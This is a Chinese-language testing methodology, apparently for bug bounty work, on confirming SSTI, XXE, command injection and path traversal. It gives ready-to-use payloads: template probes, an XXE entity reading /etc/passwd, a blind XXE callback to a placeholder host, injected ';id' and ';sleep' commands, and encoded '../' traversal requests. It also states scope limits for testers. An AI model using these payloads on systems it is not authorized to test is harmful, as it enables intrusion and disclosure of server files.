# SSTI / XXE / 命令注入 / 路径穿越

> 四种注入共用一个思路：**先证明"解释器吃到了我的输入"，再证明"能读到什么"**。

## 一、SSTI（模板注入）

### 判定

| 语言 | 探针 | 期望 |
|---|---|---|
| 通用乘式 | `${7*7}` | 返回 `49` |
| 通用 | `{{7*7}}` | 返回 `49` |
| Jinja2/Twig | `{{7*'7'}}` | 返回 `7777777` |
| Freemarker | `${7*7}` | 返回 `49` |
| Velocity | `#set($x=7*7)$x` | 返回 `49` |

**判据**：页面返回计算结果，且 **不是**把 `{{7*7}}` 原样回显。

### 升级（只到证明可执行）
- 读环境变量：`{{config}}`（Jinja2）
- 只读 1 个文件证明：`{{''.__class__.__mro__[1].__subclasses__()}}`（**只看长度，不执行命令**）

## 二、XXE（XML 外部实体）

### 判定

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

**判据**：响应里出现文件内容片段。

**盲 XXE（无回显）**：用 OOB 实体
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<你的唯一子域>.oob/">%xxe;]>
```
**判据**：OOB 收到请求。

### 变体
- 参数实体（`%`）绕过过滤
- UTF-16 编码绕过
- SVG/DOCX 上传点也常是 XXE 入口

## 三、命令注入

### 判定（时间差分最安全）

```bash
# 无回显时用时间差分
curl -s "https://target/ping?host=127.0.0.1;sleep 3"
```
**判据**：响应延迟 ≥2.5s，可重复。

### 有回显时
```
127.0.0.1;id
127.0.0.1|whoami
127.0.0.1&&echo MARKER
```
**判据**：返回命令输出（`uid=`、`MARKER`）。

**升级到 RCE 前先证明"能执行"即可**——很多平台只认命令执行回显，不做进一步利用。

## 四、路径穿越 / 任意文件读取

```bash
curl -s "https://target/download?file=../../../../etc/passwd"
curl -s "https://target/download?file=....//....//etc/passwd"   # 绕过过滤
curl -s "https://target/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"  # 编码
```
**判据**：返回文件内容（`root:x:0:0:` 等特征串）。

**Windows**：`..\..\windows\win.ini`、`C:/windows/win.ini`

## 五、判定标准

| 结果 | 结论 |
|---|---|
| SSTI 能执行表达式且能读配置 | ✅ 中高（可升级为 RCE） |
| XXE 能读文件或 OOB 回连 | ✅ 中高 |
| 命令注入有回显 | ✅ 高 |
| 命令注入仅时间差分 | ✅ 中（需可重复） |
| 路径穿越能读系统文件 | ✅ 中（属"任意文件操作"） |
| 只报错不执行 | ❌ 不算 |

## 六、证据要求

1. 探针请求 + 响应（计算结果/文件片段/延迟测量）
2. 时间类：两次测量耗时对比
3. 文件读取：只截**少量内容**证明（不下载整文件）
4. WAF 情况说明（是否被拦、怎么绕）

## 七、失败判据

- 探针被原样回显 → 未渲染
- 延迟波动无规律 → 无法证明
- 全部被 WAF 拦且无绕过 → 放弃
- 文件读取只返回错误页 → 放弃

## 八、边界（红线）

| 禁止 | 原因 |
|---|---|
| 执行 `id`/`whoami` 之外的危险命令 | 只证明执行，不做进一步控制 |
| 读 `/etc/shadow`、数据库配置、密钥文件 | 只读 `/etc/passwd` 这类无凭据文件证明 |
| 用 XXE 打内网服务 | 属对内网攻击 |
| SSTI 里执行系统命令 | 只证明表达式求值 |
| 下载整个文件 | 只截片段 |

## 九、常见坑

| 坑 | 说明 |
|---|---|
| 把回显当执行 | `{{7*7}}` 原样回显不算 |
| XXE 用 Windows 路径测 Linux 目标 | 先判断操作系统 |
| 命令注入忽略 URL 编码 | `;`、`|`、空格要编码 |
| 路径穿越忘记 `--path-as-is` | curl 会自己规范化 `../` |
